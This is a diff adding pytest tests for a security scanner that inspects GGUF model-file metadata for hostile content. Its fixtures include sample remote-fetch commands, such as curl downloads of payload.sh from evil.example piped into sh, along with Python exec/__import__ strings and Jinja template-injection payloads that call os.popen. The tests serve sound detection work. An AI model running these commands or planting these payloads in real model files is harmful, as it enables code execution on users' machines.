+@pytest.mark.parametrize(
+    "value",
+    [
+        "curl https://huggingface.co/org/model/resolve/main/payload.sh | xargs sh",
+        "curl https://huggingface.co/org/model/resolve/main/payload.sh | tee /tmp/payload.sh; sh /tmp/payload.sh",
+        'requests.delete("https://huggingface.co/org/model/resolve/main/payload.sh")',
+        'fetch("https://huggingface.co/org/model/resolve/main/payload.sh")',
+    ],
+)
+def test_gguf_metadata_documentation_hf_remote_fetch_chains_still_detected(value: str) -> None:
+    evidence = GgufScanner._metadata_value_security_evidence("general.description", value)
+
+    assert any(item["evidence_type"] == "remote_fetch" for item in evidence)
+
+
+def test_gguf_metadata_remote_url_position_index_is_bounded() -> None:
+    value = " ".join(f"https://huggingface.co/org/model/{index}" for index in range(2_000))
+
+    positions = GgufScanner._remote_url_positions(value)
+
+    assert len(positions) == _GGUF_REMOTE_URL_POSITION_LIMIT
+
+
+@pytest.mark.parametrize(
+    "value",
+    [
+        "curl --connect-timeout 'https://evil.example/payload.sh'",
+        "curl -H 'https://evil.example/header'",
+        "curl --header=https://evil.example/header",
+        "curl -F https://evil.example/form-field",
+        "curl --form=https://evil.example/form-field",
+        "curl -K https://evil.example/curlrc",
+        "curl --config=https://evil.example/curlrc",
+        "curl -ohttps://evil.example/output-name",
+        "curl --user-agent https://example.invalid/ua",
+        "curl -e https://example.invalid/ref",
+    ],
+)
+def test_gguf_metadata_curl_option_values_without_destination_stay_clean(value: str) -> None:
+    evidence = GgufScanner._metadata_value_security_evidence("download", value)
+
+    assert evidence == []
+
+
+@pytest.mark.parametrize(
+    "value",
+    [
+        "model.eval()",
+        "module.exec('noop')",
+        "loader.__import__('safe_name')",
+        "model . eval('noop')",
+        "runner . exec('noop')",
+        "loader . __import__('safe_name')",
+    ],
+)
+def test_gguf_metadata_python_attribute_methods_stay_clean(value: str) -> None:
+    evidence = GgufScanner._metadata_value_security_evidence("loader", value)
+
+    assert evidence == []
+
+
+@pytest.mark.parametrize(
+    "value",
+    [
+        "eval('1 + 1')",
+        "exec ('print(1)')",
+        "__import__ ('os')",
+        "payload = 'print(1)'; exec(payload)",
+    ],
+)
+def test_gguf_metadata_standalone_python_execution_still_detected(value: str) -> None:
+    evidence = GgufScanner._metadata_value_security_evidence("loader", value)
+
+    assert any(item["evidence_type"] == "command_execution" for item in evidence)
+
+
+def test_gguf_metadata_value_security_evidence_handles_adversarial_punctuation_quickly() -> None:
+    malicious = "curl " + "-! " * 20_000 + "https://evil.example/payload.sh"
+    benign = ("repository/name | tokenizer/path; " * 20_000) + "https://huggingface.co/org/model"
+    benign_urls = " ".join(["https://huggingface.co/org/model"] * 20_000)
+    repeated_api_tokens = "https://huggingface.co/org/model " + "fetch(nope) " * 20_000
+
+    start = time.process_time()
+    malicious_evidence = GgufScanner._metadata_value_security_evidence("download", malicious)
+    benign_evidence = GgufScanner._metadata_value_security_evidence("description", benign)
+    benign_url_evidence = GgufScanner._metadata_value_security_evidence("description", benign_urls)
+    repeated_api_evidence = GgufScanner._metadata_value_security_evidence("description", repeated_api_tokens)
+    elapsed = time.process_time() - start
+
+    assert any(evidence["evidence_type"] == "remote_fetch" for evidence in malicious_evidence)
+    assert benign_evidence == []
+    assert benign_url_evidence == []
+    assert repeated_api_evidence == []
+    elapsed_budget = 1.5 if sys.platform == "win32" else 1.0
+    assert elapsed < elapsed_budget
+
+
+def test_gguf_metadata_concrete_evidence_end_to_end_regressions(tmp_path: Path) -> None:
+    malicious_path = create_mock_gguf(
+        tmp_path / "malicious-metadata.gguf",
+        metadata={"download": "curl -o /tmp/payload.sh https://evil.example/payload.sh"},
+    )
+    benign_path = create_mock_gguf(
+        tmp_path / "benign-metadata-e2e.gguf",
+        metadata={
+            "general.base_model.0.repo_url": "https://huggingface.co/google/gemma-4-12B-it",
+            "tokenizer.chat_template": "{% for message in messages %}{{ message['content'] | trim }}{% endfor %}",
+        },
+    )
+
+    malicious_direct = GgufScanner().scan(str(malicious_path))
+    benign_direct = GgufScanner().scan(str(benign_path))
+    malicious_aggregate = scan_model_directory_or_file(str(malicious_path), cache_enabled=False)
+    benign_aggregate = scan_model_directory_or_file(str(benign_path), cache_enabled=False)
+
+    assert any(
+        check.details["evidence_type"] == "remote_fetch" for check in _failed_metadata_value_checks(malicious_direct)
+    )
+    assert _failed_metadata_value_checks(benign_direct) == []
+    assert any(issue.rule_code == "S902" and "download" in issue.message for issue in malicious_aggregate.issues)
+    assert not any(issue.rule_code == "S902" for issue in benign_aggregate.issues)
+    assert determine_exit_code(benign_aggregate) == 0
+
+
+def test_gguf_metadata_curl_short_options_detected_in_directory_scan(tmp_path: Path) -> None:
+    model_dir = tmp_path / "models"
+    model_dir.mkdir()
+    create_mock_gguf(
+        model_dir / "model.gguf",
+        metadata={"download": "curl -fO https://evil.example/payload.sh"},
+    )
+
+    aggregate = scan_model_directory_or_file(str(model_dir), cache_enabled=False)
+
+    assert any(issue.rule_code == "S902" and "download" in issue.message for issue in aggregate.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_gguf_metadata_curl_short_options_detected_from_archive_cli(tmp_path: Path) -> None:
+    model_path = create_mock_gguf(
+        tmp_path / "archived.gguf",
+        metadata={"download": "curl -K /tmp/curlrc https://evil.example/payload.sh"},
+    )
+    archive_path = tmp_path / "bundle.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.write(model_path, "nested/archived.gguf")
+
+    result = CliRunner().invoke(cli, ["scan", str(archive_path), "--format", "json", "--no-cache"])
+
+    assert result.exit_code == 0
+    payload = parse_click_json_output(result.output)
+    assert any(
+        issue.get("rule_code") == "S902" and "download" in issue.get("message", "") for issue in payload["issues"]
+    )
+
+
+def test_gguf_rank_262_shaped_tokenizer_metadata_arrays_are_report_truncated(tmp_path: Path) -> None:
+    path = tmp_path / "rank-262-shaped.gguf"
+    _write_rank_262_shaped_tokenizer_gguf(path)
+
+    result = GgufScanner().scan(str(path))
+    extracted = GgufScanner().extract_metadata(str(path))
+    serialized = result.to_json()
+
+    assert result.success
+    assert result.metadata["metadata_arrays_truncated"] is True
+    truncation = result.metadata["metadata_array_truncation"]
+    for key in ("tokenizer.ggml.tokens", "tokenizer.ggml.merges", "tokenizer.ggml.scores"):
+        assert truncation[key]["original_count"] == _RANK_262_TOKENIZER_ITEM_COUNT
+        assert truncation[key]["reported_count"] == GgufScanner.DEFAULT_MAX_REPORTED_TOKENIZER_METADATA_ARRAY_ITEMS
+        assert truncation[key]["truncated_count"] == (
+            _RANK_262_TOKENIZER_ITEM_COUNT - GgufScanner.DEFAULT_MAX_REPORTED_TOKENIZER_METADATA_ARRAY_ITEMS
+        )
+        assert len(result.metadata["metadata"][key]) == GgufScanner.DEFAULT_MAX_REPORTED_TOKENIZER_METADATA_ARRAY_ITEMS
+    assert "token-262143" not in serialized
+    assert "merge-262143" not in serialized
+    assert len(serialized) < 1_000_000
+    assert extracted["metadata_arrays_truncated"] is True
+    assert extracted["metadata_array_truncation"]["tokenizer.ggml.tokens"]["original_count"] == (
+        _RANK_262_TOKENIZER_ITEM_COUNT
+    )
+    assert len(extracted["model_info"]["tokenizer_ggml_tokens"]) == (
+        GgufScanner.DEFAULT_MAX_REPORTED_TOKENIZER_METADATA_ARRAY_ITEMS
+    )
+
+
+def test_gguf_rank_262_shaped_tokenizer_truncation_survives_cached_aggregate_json(tmp_path: Path) -> None:
+    path = tmp_path / "cached-rank-262-shaped.gguf"
+    cache_dir = tmp_path / "cache"
+    _write_rank_262_shaped_tokenizer_gguf(path)
+    reset_cache_manager()
+
+    first = scan_model_directory_or_file(
+        str(path),
+        cache_enabled=True,
+        cache_dir=str(cache_dir),
+        min_cache_file_size=0,
+    )
+    second = scan_model_directory_or_file(
+        str(path),
+        cache_enabled=True,
+        cache_dir=str(cache_dir),
+        min_cache_file_size=0,
+    )
+    first_metadata = _single_file_metadata(first)
+    second_metadata = _single_file_metadata(second)
+    serialized = json.dumps(second.model_dump(mode="json"), sort_keys=True)
+
+    assert first_metadata["metadata_arrays_truncated"] is True
+    assert second_metadata["metadata_arrays_truncated"] is True
+    assert second_metadata["metadata_array_truncation"] == first_metadata["metadata_array_truncation"]
+    assert len(second_metadata["metadata"]["tokenizer.ggml.tokens"]) == (
+        GgufScanner.DEFAULT_MAX_REPORTED_TOKENIZER_METADATA_ARRAY_ITEMS
+    )
+    assert "token-262143" not in serialized
+    assert len(serialized) < 1_000_000
+
+
+def test_gguf_metadata_value_check_details_are_bounded_for_giant_values(tmp_path: Path) -> None:
+    payload = "curl https://evil.example/payload.sh " + ("A" * 100_000)
+    path = create_mock_gguf(tmp_path / "giant-malicious-metadata.gguf", metadata={"download": payload})
+
+    result = GgufScanner().scan(str(path))
+
+    checks = _failed_metadata_value_checks(result)
+    assert checks
+    assert len(checks[0].details["value"]) == 200
+
+
+def test_gguf_metadata_value_checks_are_capped_for_repeated_nested_arrays(tmp_path: Path) -> None:
+    payload = b"".join(_encode_gguf_string(f"curl https://evil.example/payload-{index}.sh") for index in range(80))
+    path = tmp_path / "many-nested-malicious-values.gguf"
+    _write_gguf_raw_metadata_entries(
+        path,
+        [("download.array", 9, _encode_gguf_array(8, payload, 80))],
+    )
+
+    result = GgufScanner().scan(str(path))
+
+    checks = _failed_metadata_value_checks(result)
+    assert len(checks) == 64
+    assert result.metadata["metadata_value_security_checks_truncated"] is True
+
+
+def test_gguf_metadata_array_strings_after_large_benign_prefix_are_scanned(tmp_path: Path) -> None:
+    payload = b"".join(_encode_gguf_string(f"benign-token-{index}") for index in range(1100))
+    payload += _encode_gguf_string("curl https://evil.example/payload.sh")
+    path = tmp_path / "late-malicious-array-value.gguf"
+    _write_gguf_raw_metadata_entries(
+        path,
+        [("download.array", 9, _encode_gguf_array(8, payload, 1101))],
+    )
+
+    result = GgufScanner().scan(str(path))
+
+    checks = _failed_metadata_value_checks(result)
+    assert len(checks) == 1
+    assert checks[0].details["value_path"] == "[1100]"
+    assert checks[0].details["evidence_type"] == "remote_fetch"
+
+
+def test_gguf_nested_metadata_array_strings_are_scanned_without_flagging_benign_urls(tmp_path: Path) -> None:
+    path = tmp_path / "nested-string-array.gguf"
+    _write_gguf_raw_metadata_entries(
+        path,
+        [
+            (
+                "download.array",
+                9,
+                _encode_gguf_array(
+                    8,
+                    _encode_gguf_string("https://huggingface.co/org/model")
+                    + _encode_gguf_string("curl https://evil.example/payload.sh"),
+                    2,
+                ),
+            )
+        ],
+    )
+
+    result = GgufScanner().scan(str(path))
+
+    checks = _failed_metadata_value_checks(result)
+    assert len(checks) == 1
+    assert checks[0].details["value_path"] == "[1]"
+    assert checks[0].details["evidence_type"] == "remote_fetch"
+
+
+def test_gguf_tokenizer_vocabulary_array_strings_are_inert_metadata(tmp_path: Path) -> None:
+    path = tmp_path / "tokenizer-vocabulary-array.gguf"
+    _write_gguf_raw_metadata_entries(
+        path,
+        [
+            (
+                "tokenizer.ggml.tokens",
+                9,
+                _encode_gguf_array(
+                    8,
+                    _encode_gguf_string("curl https://evil.example/payload.sh")
+                    + _encode_gguf_string("{{ ''.__class__.__mro__[1].__subclasses__() }}"),
+                    2,
+                ),
+            )
+        ],
+    )
+
+    result = GgufScanner().scan(str(path))
+
+    assert _failed_metadata_value_checks(result) == []
+
+
+def test_gguf_tokenizer_merges_array_strings_are_inert_metadata(tmp_path: Path) -> None:
+    path = tmp_path / "tokenizer-merges-array.gguf"
+    _write_gguf_raw_metadata_entries(
+        path,
+        [
+            (
+                "tokenizer.ggml.merges",
+                9,
+                _encode_gguf_array(
+                    8,
+                    _encode_gguf_string("../ordinary-tokenizer-merge")
+                    + _encode_gguf_string("curl https://evil.example/payload.sh"),
+                    2,
+                ),
+            )
+        ],
+    )
+
+    result = GgufScanner().scan(str(path))
+
+    assert _failed_metadata_value_checks(result) == []
+
+
+@pytest.mark.parametrize("key", ["tokenizer.ggml.tokens.payload", "tokenizer.ggml.merges.payload"])
+def test_gguf_tokenizer_inert_array_prefixed_metadata_is_scanned(tmp_path: Path, key: str) -> None:
+    path = create_mock_gguf(
+        tmp_path / "tokenizer-vocabulary-prefixed-payload.gguf",
+        metadata={key: "curl https://evil.example/payload.sh"},
+    )
+
+    result = GgufScanner().scan(str(path))
+
+    checks = _failed_metadata_value_checks(result)
+    assert len(checks) == 1
+    assert checks[0].details["evidence_type"] == "remote_fetch"
+
+
+def test_gguf_malformed_utf8_metadata_fails_closed(tmp_path: Path) -> None:
+    path = tmp_path / "malformed-utf8-metadata.gguf"
+    _write_gguf_raw_metadata_entries(
+        path,
+        [("general.description", 8, struct.pack("<Q", 8) + b"\xff\xfe\xfa\x00safe")],
+    )
+
+    result = GgufScanner().scan(str(path))
+    aggregate = scan_model_directory_or_file(str(path), cache_enabled=False)
+
+    assert result.success is False
+    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert GGUF_PARSE_INCONCLUSIVE_REASON in result.metadata["scan_outcome_reasons"]
+    assert _failed_metadata_value_checks(result) == []
+    _assert_inconclusive_exit2(aggregate, GGUF_PARSE_INCONCLUSIVE_REASON)
+
+
+def test_gguf_malformed_utf8_metadata_with_prior_malicious_value_preserves_finding(tmp_path: Path) -> None:
+    path = tmp_path / "malformed-utf8-after-malicious-metadata.gguf"
+    _write_gguf_raw_metadata_entries(
+        path,
+        [
+            ("download", 8, _encode_gguf_string("curl https://evil.example/payload.sh")),
+            ("general.description", 8, struct.pack("<Q", 8) + b"\xff\xfe\xfa\x00safe"),
+        ],
+    )
+
+    result = GgufScanner().scan(str(path))
+    aggregate = scan_model_directory_or_file(str(path), cache_enabled=False)
+
+    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert any(check.details["evidence_type"] == "remote_fetch" for check in _failed_metadata_value_checks(result))
+    assert any(issue.rule_code == "S902" and "download" in issue.message for issue in aggregate.issues)
+    assert determine_exit_code(aggregate) == 2
+
+
+def test_gguf_chat_template_command_payload_still_uses_jinja_analysis(tmp_path: Path) -> None:
+    target = tmp_path / "template-target.txt"
+    target.write_text("fixture", encoding="utf-8")
+    path = create_mock_gguf(
+        tmp_path / "unsafe-template.gguf",
+        metadata={
+            "tokenizer.chat_template": (
+                "{{ cycler.__init__.__globals__.os.popen('cat " + target.as_posix() + "').read() }}"
+            ),
+        },
+    )
+
+    result = GgufScanner().scan(str(path))
+
+    assert _failed_metadata_value_checks(result) == []
+    assert any(
+        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
 
 
 def test_gguf_scanner_string_length_security(tmp_path: Path) -> None:
